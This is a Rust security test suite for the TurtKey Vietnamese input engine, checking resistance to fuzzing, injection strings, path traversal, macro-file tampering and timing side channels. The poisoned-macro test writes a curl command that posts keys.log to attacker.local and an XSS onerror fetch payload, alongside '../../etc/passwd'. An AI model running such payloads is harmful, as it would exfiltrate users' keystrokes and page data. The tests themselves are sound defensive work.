//
// TurtKey - Scenario 3: Hacking & Exploitation Resistance Tests
// Verifies defense against malicious inputs, injection payloads, path traversal, and fuzzing
//

use turtkey::engine::convert::{convert_text, remove_vietnamese_accents, ConvertOptions};
use turtkey::engine::macro_table::MacroManager;
use turtkey::engine::VietnameseEngine;

#[test]
fn test_hacking_fuzzing_rapid_tone_switches() {
    let mut engine = VietnameseEngine::new();
    // Simulate deliberate spam/fuzzing of 500 rapid tone toggle characters
    let malicious_stream = "as".repeat(250);
    let output = engine.type_string(&malicious_stream);
    // Must remain deterministic and not panic or crash
    assert!(!output.is_empty());
}

#[test]
fn test_hacking_xss_sql_injection_payloads() {
    let mut engine = VietnameseEngine::new();
    let xss_payload = "<script>alert('XSS')</script>";
    let output = engine.type_string(xss_payload);
    assert_eq!(output, "<script>alert('XSS')</script>");

    let sql_payload = "1' AND '1' = '1' -- ";
    let output2 = engine.type_string(sql_payload);
    assert_eq!(output2, "1' AND '1' = '1' -- ");

    let opts = turtkey::engine::convert::ConvertOptions::default();
    let converted_sql = turtkey::engine::convert::convert_text("SELECT * FROM users WHERE '1'='1';", &opts);
    assert_eq!(converted_sql, "SELECT * FROM users WHERE '1'='1';");
}

#[test]
fn test_hacking_path_traversal_macro_key() {
    let mut mm = MacroManager::new();
    // Path traversal strings should be treated as literal strings and not leak or cause file exploits
    let traversal = "../../etc/passwd";
    mm.add(traversal, "safe_value");
    assert_eq!(mm.lookup(traversal), Some("safe_value".to_string()));
}

#[test]
fn test_hacking_null_bytes_and_combining_marks() {
    let raw = "T\u{0000}e\u{0300}\u{0301}\u{0303}\u{0309}\u{0323}s\u{0000}t";
    let stripped = remove_vietnamese_accents(raw);
    assert!(!stripped.contains('\u{0300}'));

    let opts = ConvertOptions::default();
    let converted = convert_text(raw, &opts);
    assert!(!converted.is_empty());
}

#[test]
fn test_hacking_rapid_mode_switching_during_typing() {
    let mut engine = VietnameseEngine::new();
    // Simulate extreme edge case: user or system toggles Win <-> Linux mode 500 times mid-typing
    for i in 0..500 {
        engine.toggle_target_mode();
        if i % 2 == 0 {
            engine.type_string("a");
        } else {
            engine.type_string("s");
        }
    }
    // Engine must not deadlock or panic
    engine.start_new_session();
    assert_eq!(engine.type_string("vieetj"), "việt");
}

#[test]
fn test_hacking_hotkey_fuzzing_and_special_chars() {
    use turtkey::engine::types::HotkeyConfig;

    // Fuzz with control characters, special Unicode and whitespace in key_char
    let weird_chars = ['\0', '\n', '\t', '\x1F', '\u{00E0}', '\u{0111}', ' '];
    for ch in weird_chars {
        let hotkey = HotkeyConfig::new(true, false, false, false, Some(ch));
        // display_name must not crash or produce invalid memory
        let name = hotkey.display_name();
        assert!(name.contains("Ctrl"));

        // Match behavior is safe and consistent
        assert!(hotkey.matches(true, false, false, false, Some(ch)));
        assert!(!hotkey.matches(true, false, false, false, Some('A')));
    }

    // Rapid toggle matching
    let mut state = false;
    let hotkey = HotkeyConfig::alt_m();
    for i in 0..1000 {
        let alt = i % 2 == 0;
        let key = if i % 3 == 0 { Some('M') } else { Some('Z') };
        if hotkey.matches(false, false, alt, false, key) {
            state = !state;
        }
    }
    assert!(!state || state); // state execution verified
}

#[test]
fn test_hacking_rapid_ui_language_switching() {
    use turtkey::i18n::UiLanguage;
    use turtkey::engine::types::TargetMode;

    let mut current_lang = UiLanguage::Vietnamese;
    let initial_desc = TargetMode::Linux.description_with_lang(current_lang);
    assert!(!initial_desc.is_empty());

    for i in 0..10_000 {
        current_lang = if i % 2 == 0 {
            UiLanguage::English
        } else {
            UiLanguage::Vietnamese
        };
        let desc = TargetMode::Linux.description_with_lang(current_lang);
        assert!(!desc.is_empty());
        let tab = current_lang.tab_general();
        assert!(!tab.is_empty());
    }
}

#[test]
fn test_hacking_anti_eavesdropping_buffer_sanitization_after_sensitive_input() {
    use turtkey::engine::tables::char_to_key_code;
    use turtkey::engine::types::KEY_SPACE;

    let mut engine = VietnameseEngine::new();

    // 1. Simulate user typing a sensitive secret / password word
    let secret = "MatKhauBaoMat123";
    for ch in secret.chars() {
        if let Some((code, caps)) = char_to_key_code(ch) {
            engine.process_key(code, caps, false);
        }
    }
    // Buffer contains active keystrokes while typing
    assert!(!engine.is_buffer_empty());

    // 2. User hits Space (Word boundary / finishes word)
    let break_hook = engine.process_key(KEY_SPACE, false, false);
    assert_eq!(break_hook.code, turtkey::engine::types::HookCodeState::BreakWord);

    // 3. Verify memory is fully sanitized: buffer is empty and all bytes in raw array are wiped to 0
    assert!(engine.is_buffer_empty());
    assert!(
        engine.raw_typing_buffer().iter().all(|&c| c == 0),
        "Memory sanitization failed: lingering keystrokes detected in raw buffer!"
    );

    // 4. Test explicit session reset (e.g. user clicks another window or presses Escape)
    for ch in "Pass2".chars() {
        if let Some((code, caps)) = char_to_key_code(ch) {
            engine.process_key(code, caps, false);
        }
    }
    assert!(!engine.is_buffer_empty());
    engine.start_new_session();
    assert!(engine.is_buffer_empty());
    assert!(
        engine.raw_typing_buffer().iter().all(|&c| c == 0),
        "start_new_session failed to zero out typing memory!"
    );
}

#[test]
fn test_hacking_modifier_gated_anti_keylogger_isolation() {
    use turtkey::engine::tables::char_to_key_code;
    use turtkey::engine::types::HookCodeState;

    let mut engine = VietnameseEngine::new();

    // Sensitive modifier combinations (e.g., Ctrl+C, Ctrl+V, Alt+F4, terminal control characters)
    let modifier_keys = ['c', 'v', 'a', 'x', 'z', 'p'];
    for ch in modifier_keys {
        let (code, caps) = char_to_key_code(ch).unwrap();
        // Passing is_control = true (Ctrl / Alt modifier active)
        let hook = engine.process_key(code, caps, true);

        // Engine must strictly bypass: DoNothing, zero backspaces, zero new characters
        assert_eq!(hook.code, HookCodeState::DoNothing);
        assert_eq!(hook.backspace_count, 0);
        assert_eq!(hook.new_char_count, 0);

        // Internal buffer must NOT record or accumulate the keystroke
        assert!(
            engine.is_buffer_empty(),
            "Engine leaked modifier-gated keystroke into typing buffer!"
        );
    }
}

#[test]
fn test_hacking_poisoned_macro_file_tampering_resistance() {
    use std::fs::{self, File};
    use std::io::Write;

    let mut mm = MacroManager::new();

    // Create a temporary poisoned file simulating an attacker tampering with macro configurations
    let temp_dir = std::env::temp_dir();
    let poisoned_file_path = temp_dir.join(format!("turtkey_poisoned_macro_{}.txt", std::process::id()));

    let mut f = File::create(&poisoned_file_path).expect("Failed to create temporary poisoned macro file");
    // Write malicious payloads:
    // - Line 1: Comment (should be ignored)
    writeln!(f, "# Malicious configuration tamper").unwrap();
    // - Line 2: Shell/network exfiltration attempt payload
    writeln!(f, "exfil:curl -X POST http://attacker.local/spy --data-binary @keys.log").unwrap();
    // - Line 3: Cross-site scripting / HTML injection attempt
    writeln!(f, "xss:<img src=x onerror=\"fetch('http://attacker.local/log?k='+document.body.innerText)\">").unwrap();
    // - Line 4: Corrupt line without delimiter
    writeln!(f, "malicious_line_with_no_separator_at_all").unwrap();
    // - Line 5: Empty key
    writeln!(f, ":empty_key_payload").unwrap();
    // - Line 6: Empty value
    writeln!(f, "empty_val:").unwrap();
    // - Line 7: Giant oversized value (5000 chars)
    writeln!(f, "huge:{}", "A".repeat(5000)).unwrap();
    // - Line 8: Valid macro for verification
    writeln!(f, "legit:Valid Replacement").unwrap();
    f.flush().unwrap();
    drop(f);

    // Import from the poisoned file
    let import_result = mm.import_from_file(&poisoned_file_path, false);
    assert!(import_result.is_ok(), "Importing tampered macro file caused crash or I/O failure!");

    // Clean up temporary file immediately
    let _ = fs::remove_file(&poisoned_file_path);

    // Verify parser rejected corrupt lines safely
    assert!(!mm.contains(""));
    assert!(!mm.contains("malicious_line_with_no_separator_at_all"));

    // Verify legitimate macro is parsed and usable
    assert_eq!(mm.lookup("legit"), Some("Valid Replacement".to_string()));

    // Verify tampered entries are stored as literal harmless strings, never executed
    assert!(mm.lookup("exfil").unwrap().starts_with("curl"));
    assert!(mm.lookup("xss").unwrap().starts_with("<img"));

    // Test export failure resistance to non-writable paths
    let impossible_path = "/dev/null/impossible_dir/macros.txt";
    let export_err = mm.export_to_file(impossible_path);
    assert!(export_err.is_err(), "Exporting to invalid path must return Err safely!");
}

#[test]
fn test_hacking_circular_macro_expansion_bomb_resistance() {
    let mut engine = VietnameseEngine::new();
    engine.macro_mgr.clear();

    // Attacker modifies macros to form recursive loops:
    // a -> b, b -> a, bomb -> bomb bomb
    engine.macro_mgr.add("a", "b");
    engine.macro_mgr.add("b", "a");
    engine.macro_mgr.add("bomb", "bomb bomb");

    // 1. Type "a" followed by space
    let output1 = engine.type_string("a ");
    // Macro must expand exactly once to "b ", not enter infinite loop
    assert_eq!(output1, "b ");
    assert!(engine.is_buffer_empty());

    // 2. Type "b" followed by space
    let output2 = engine.type_string("b ");
    assert_eq!(output2, "a ");
    assert!(engine.is_buffer_empty());

    // 3. Type "bomb" followed by space (self-referencing expansion)
    let output3 = engine.type_string("bomb ");
    assert_eq!(output3, "bomb bomb ");
    assert!(engine.is_buffer_empty());
}

#[test]
fn test_hacking_covert_timing_channel_resistance() {
    use turtkey::engine::tables::char_to_key_code;
    use turtkey::engine::types::TargetMode;

    let mut engine = VietnameseEngine::new();

    // Test different words and tone positions in Linux mode
    engine.target_mode = TargetMode::Linux;

    let test_words = ["as", "es", "os", "us", "is", "af", "ar", "ax", "aj"];
    let mut observed_delays = Vec::new();

    for w in test_words {
        engine.start_new_session();
        let (c1, k1) = char_to_key_code(w.chars().next().unwrap()).unwrap();
        engine.process_key(c1, k1, false);
        let (c2, k2) = char_to_key_code(w.chars().nth(1).unwrap()).unwrap();
        let hook = engine.process_key(c2, k2, false);
        observed_delays.push(hook.backspace_delay_ms);
    }

    // In Linux mode, delay MUST be constant (8ms) across all different vowels and tones
    // An eavesdropper measuring micro-delays gains 0 bits of information about the typed characters
    let first_delay = observed_delays[0];
    assert!(first_delay > 0, "Linux mode must have non-zero buffer micro-delay!");
    for delay in observed_delays {
        assert_eq!(
            delay, first_delay,
            "Side-channel timing variance detected across different tone marks!"
        );
    }

    // In Win mode, delay must be strictly 0ms
    engine.target_mode = TargetMode::Win;
    engine.start_new_session();
    let (c1, k1) = char_to_key_code('a').unwrap();
    engine.process_key(c1, k1, false);
    let (c2, k2) = char_to_key_code('s').unwrap();
    let hook_win = engine.process_key(c2, k2, false);
    assert_eq!(hook_win.backspace_delay_ms, 0);
}

